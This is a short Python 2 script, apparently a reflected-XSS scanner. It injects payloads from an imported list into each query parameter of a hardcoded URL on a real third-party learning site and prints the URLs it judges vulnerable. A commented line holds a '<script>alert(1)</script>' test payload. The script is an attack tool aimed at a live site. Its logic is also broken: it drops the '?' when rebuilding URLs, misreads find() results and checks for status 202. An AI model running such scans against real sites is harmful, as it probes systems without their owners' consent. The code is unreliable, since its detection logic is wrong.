# encoding=utf-8
import requests
import xsspayload
# xssplayload='<script>alert(1)</script>'
# r=requests.get("http://127.0.0.1:8080/"+xssplayload)
# print r.content.find('<script>alert(1)</script>')
test_url='https://www.shiyanlou.com/courses/?a=1&b=2&c=3'
domain=test_url.split('?')[0]
_url=test_url.split('?')[-1]
pararm = {}
for val in _url.split("&"):
    pararm[val.split("=")[0]] = val.split("=")[-1]
urls=[]
for val in pararm.values():
    new_url = domain + _url.replace(val, "Payload")
    urls.append(new_url)
for payload in xsspayload.xsspayload:
    for __url in urls:
        try:
            content=requests.get(__url.replace('Payload',payload)).content
            if content.find(payload) and requests.get(__url.replace('Payload',payload)).status_code==202:
                print __url
        except Exception,e:
            pass
